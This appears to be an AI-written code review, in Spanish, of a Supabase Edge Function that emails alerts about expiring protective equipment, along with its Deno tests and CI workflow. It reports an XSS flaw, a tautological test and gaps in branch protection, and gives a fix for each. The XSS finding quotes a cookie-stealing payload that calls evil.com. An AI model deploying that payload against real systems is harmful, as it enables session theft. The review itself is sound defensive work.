---
phase: 06-edge-function-tests
reviewed: 2026-06-14T12:00:00Z
depth: standard
files_reviewed: 4
files_reviewed_list:
  - supabase/functions/notif-vencimiento/index.ts
  - supabase/functions/tests/notif-vencimiento-test.ts
  - supabase/functions/tests/deno.json
  - .github/workflows/test.yml
findings:
  critical: 4
  warning: 6
  info: 0
  total: 10
status: issues_found
---

# Phase 06: Code Review Report

**Reviewed:** 2026-06-14T12:00:00Z
**Depth:** standard
**Files Reviewed:** 4
**Status:** issues_found

## Summary

Se revisaron la Edge Function `notif-vencimiento`, su suite de tests Deno, la configuración del runner de tests (`deno.json`) y el workflow de CI. Se encontraron cuatro issues críticos y seis advertencias.

Los problemas más graves son: (1) una excepción TypeScript garantizada en el bloque `catch` al acceder a `.message` sobre un tipo `unknown`, (2) XSS almacenado en el template HTML de email por falta de escape, (3) un test de DRY_RUN que es una tautología — siempre pasa sin importar si la guardia en el handler funciona — y (4) el job `deno-test` en CI no está listado en branch protection, por lo que un edge function roto puede mergearse sin bloqueo.

---

## Critical Issues

### CR-01: Acceso a `.message` sobre tipo `unknown` en el bloque catch — runtime crash garantizado

**File:** `supabase/functions/notif-vencimiento/index.ts:215`
**Issue:** En TypeScript (y Deno), el parámetro de `catch (e)` tiene tipo `unknown`. Acceder a `e.message` sin un type guard es un error de tipo que en tiempo de ejecución lanza `TypeError: Cannot read properties of undefined` si `e` no es una instancia de `Error` (por ejemplo, si alguien hace `throw 'string error'` o `throw { code: 404 }`). La función de producción quedaría en un estado de error irrecuperable.

**Fix:**
```typescript
} catch (e) {
  const msg = e instanceof Error ? e.message : String(e);
  console.error('Error en notif-vencimiento:', e);
  return new Response(`Error: ${msg}`, { status: 500 });
}
```

---

### CR-02: XSS almacenado — interpolación de datos de DB sin escaping en HTML de email

**File:** `supabase/functions/notif-vencimiento/index.ts:59-63`
**Issue:** `buildEmailHtml` interpola directamente en el HTML de email los campos `v.trabajador_nombre`, `v.trabajador_rut`, `v.obra_nombre`, `v.epp_nombre` y `v.epp_codigo`. Estos valores provienen de la base de datos (tabla `perfiles`, catálogo EPP, tabla de obras). Si cualquiera de esos registros contiene `<script>alert(1)</script>` o `"><img src=x onerror=fetch('https://evil.com?c='+document.cookie)>`, el payload se ejecutará en el cliente de email del administrador que lo reciba. Esto constituye XSS almacenado a través del canal de email.

El test EFN-03 (Test 4 en la suite) incluso documenta esta condición — `assertStringIncludes(html, '<script>')` — confirmando que el payload pasa sin modificación al HTML final.

**Fix:**
```typescript
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// Aplicar en filas del template:
<td ...>${icono} ${escapeHtml(v.epp_nombre)} <span ...>(${escapeHtml(v.epp_codigo)})</span></td>
<td ...>${escapeHtml(v.trabajador_nombre)}<br><span ...>${escapeHtml(v.trabajador_rut)}</span></td>
<td ...>${escapeHtml(v.obra_nombre)}</td>
```

---

### CR-03: Test DRY_RUN es una tautología — no verifica la guardia real del handler

**File:** `supabase/functions/tests/notif-vencimiento-test.ts:115-138`
**Issue:** El test "DRY_RUN: la guardia bloquea el envio" establece `Deno.env.set('DRY_RUN', '1')` y luego replica la condición de la guardia:

```typescript
if (!Deno.env.get('DRY_RUN')) {
  await sendResendEmail(...)
}
```

Esta condición es siempre `false` cuando `DRY_RUN` está activo, por lo que `sendResendEmail` nunca se invoca. El test luego afirma `assertSpyCalls(mockFetch, 0)` — que siempre es verdadero. El test pasará aunque la guardia real en `index.ts` (línea 151) sea eliminada o invertida. No existe ningún camino de código que realmente pruebe la guardia `if (Deno.env.get('DRY_RUN'))` del handler. La cobertura EFN-01 declarada en el comentario es falsa.

**Fix:** El test debe verificar el comportamiento real de la guardia. Como el handler vive dentro de `if (import.meta.main)`, la solución correcta es extraer la lógica de negocio a una función exportable y testearla directamente:

```typescript
// En index.ts: extraer handler como función exportada
export async function handleRequest(env: {
  supabaseUrl: string;
  serviceKey: string;
  resendKey: string;
  dryRun: boolean;
}): Promise<Response> {
  if (env.dryRun) {
    return new Response('DRY_RUN: no emails sent.', { status: 200 });
  }
  // ... resto de la lógica
}

// En el test:
Deno.test('DRY_RUN bloquea el handler y no llama a fetch', async () => {
  globalThis.fetch = mockFetch;
  const res = await handleRequest({ ..., dryRun: true });
  assertEquals(res.status, 200);
  assertStringIncludes(await res.text(), 'DRY_RUN');
  assertSpyCalls(mockFetch, 0); // ahora esto tiene valor real
});
```

---

### CR-04: Job `deno-test` no está en branch protection — un edge function roto puede mergearse

**File:** `.github/workflows/test.yml:62-79`
**Issue:** El workflow define dos jobs: `test` (Flutter) y `deno-test` (Deno/Edge Functions). Según CLAUDE.md (sección CI/CD), branch protection está configurada para requerir solo el check `test`. El job `deno-test` corre en paralelo pero no bloquea el merge. Si la Edge Function tiene un error de compilación o cualquier test Deno falla, el PR puede mergearse igualmente.

Además, no hay `needs: [test]` declarado, lo que no es un problema funcional (pueden correr en paralelo) pero confirma que son independientes para efectos de branch protection.

**Fix:** Agregar el job `deno-test` como status check requerido en la configuración de branch protection de GitHub:

1. Ir a **GitHub repo > Settings > Branches > Branch protection rule** para `main`.
2. En "Require status checks to pass before merging", buscar y agregar `deno-test`.
3. Guardar la regla.

Alternativamente, si se quiere un único punto de bloqueo, encadenar los jobs:
```yaml
deno-test:
  needs: [test]   # o quitar needs y agregar deno-test a branch protection
  runs-on: ubuntu-latest
```

---

## Warnings

### WR-01: Non-null assertions sobre variables de entorno sin mensaje de error descriptivo

**File:** `supabase/functions/notif-vencimiento/index.ts:145-147`
**Issue:** Las tres llamadas a `Deno.env.get(...)!` usan el operador non-null assertion. Si alguna variable de entorno no está configurada en el entorno de Supabase (por ejemplo, `RESEND_API_KEY` en un deploy nuevo), el error resultante será `TypeError: Cannot read properties of undefined` con un stack trace críptico, sin indicar qué variable falta.

**Fix:**
```typescript
function requireEnv(name: string): string {
  const val = Deno.env.get(name);
  if (!val) throw new Error(`Missing required env var: ${name}`);
  return val;
}

const SUPABASE_URL         = requireEnv('SUPABASE_URL');
const SUPABASE_SERVICE_KEY = requireEnv('SUPABASE_SERVICE_ROLE_KEY');
const RESEND_API_KEY       = requireEnv('RESEND_API_KEY');
```

---

### WR-02: `sendResendEmail` no maneja errores de red — promesa rechazada sin captura

**File:** `supabase/functions/notif-vencimiento/index.ts:35-44`
**Issue:** Si `fetch` lanza (timeout, DNS failure, connection refused), la excepción no está capturada dentro de `sendResendEmail`. La función tiene return type `Promise<boolean>` pero puede rechazarse. En el loop de orgs (línea 200), se hace `await sendResendEmail(...)` sin try/catch local; un fallo de red en una org rechaza la promesa y salta directamente al `catch` del handler exterior, abortando el procesamiento de todas las orgs restantes.

**Fix:**
```typescript
export async function sendResendEmail(
  to: string[],
  subject: string,
  html: string,
  apiKey: string,
): Promise<boolean> {
  try {
    const res = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${apiKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ from: FROM_EMAIL, to, subject, html }),
    });
    return res.ok;
  } catch {
    return false;  // red caída = fallo silencioso, el caller registra el error
  }
}
```

---

### WR-03: Validación de email con `includes('@')` es insuficiente

**File:** `supabase/functions/notif-vencimiento/index.ts:187-189`
**Issue:** El filtro `!!e && e.includes('@')` acepta strings como `@`, `a@`, `user@` (sin dominio), o cualquier string con `@` en cualquier posición. Si un perfil tiene un valor malformado en `email_notif`, se enviará al array `to` de Resend, que puede rechazar la request o (en algunos proveedores) permitir header injection si el valor contiene `\n` o `\r`.

**Fix:**
```typescript
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const emails = (destinatarios as Destinatario[])
  .map(d => d.email_notif)
  .filter((e): e is string => !!e && EMAIL_RE.test(e));
```

---

### WR-04: Test 4 (XSS) declara el comportamiento inseguro como correcto

**File:** `supabase/functions/tests/notif-vencimiento-test.ts:62-70`
**Issue:** El test afirma `assertStringIncludes(html, '<script>')`, verificando que el payload XSS pasa al HTML sin modificación. El comentario dice "sanitización fuera del scope de esta fase", pero el test no tiene un waiver formal (skip o `// @audit`) y pasa el check de CI. Esto crea documentación ejecutable que certifica el comportamiento inseguro como correcto.

**Fix:** Si la sanitización es intencional para esta fase, el test debe documentar la deuda explícitamente y verificar el comportamiento esperado post-fix (o usar `Deno.test.ignore`). Una vez aplicado CR-02, el test debe actualizarse para verificar que `&lt;script&gt;` aparece en el HTML (escaped), no `<script>` literal:
```typescript
// Post-fix:
assertStringIncludes(html, '&lt;script&gt;');
```

---

### WR-05: `formatFecha` agrega `T12:00:00` para evitar timezone drift — sin documentar

**File:** `supabase/functions/notif-vencimiento/index.ts:138`
**Issue:** `new Date(iso + 'T12:00:00')` es un workaround correcto para evitar que fechas como `'2026-06-17'` se interpreten como UTC medianoche y aparezcan como el día anterior en zonas horarias negativas. Sin embargo, no hay comentario explicando por qué se hace. La próxima persona que edite esta función puede "corregir" esto a `new Date(iso)` rompiendo silenciosamente la presentación de fechas para usuarios en America/Santiago.

**Fix:**
```typescript
export function formatFecha(iso: string): string {
  // Agregar T12:00:00 para evitar UTC midnight → day-before drift en zonas UTC-
  return new Date(iso + 'T12:00:00').toLocaleDateString('es-CL', {
    day: '2-digit', month: 'short', year: 'numeric',
  });
}
```

---

### WR-06: Asunto del email usa `criticos[0].dias_restantes` — puede ser engañoso

**File:** `supabase/functions/notif-vencimiento/index.ts:196`
**Issue:** El asunto cuando hay críticos es `🔴 N EPP vence(n) en X días — TrazApp` donde `X = criticos[0].dias_restantes`. Si hay múltiples EPPs críticos con distintos días restantes (ej: uno vence en 1 día y otro en 7), el asunto muestra los días del primero arbitrariamente (orden dependiente del resultado del RPC). Para un destinatario con 5 EPPs críticos, puede recibir "EPP vence en 7 días" cuando en realidad uno vence mañana.

**Fix:**
```typescript
const minDias = Math.min(...criticos.map(c => c.dias_restantes));
const asunto = criticos.length > 0
  ? `🔴 ${criticos.length} EPP vence${criticos.length > 1 ? 'n' : ''} en ${minDias} días — TrazApp`
  : `⚠️ ${avisos.length} EPP próximo${avisos.length > 1 ? 's' : ''} a vencer — TrazApp`;
```

---

_Reviewed: 2026-06-14T12:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
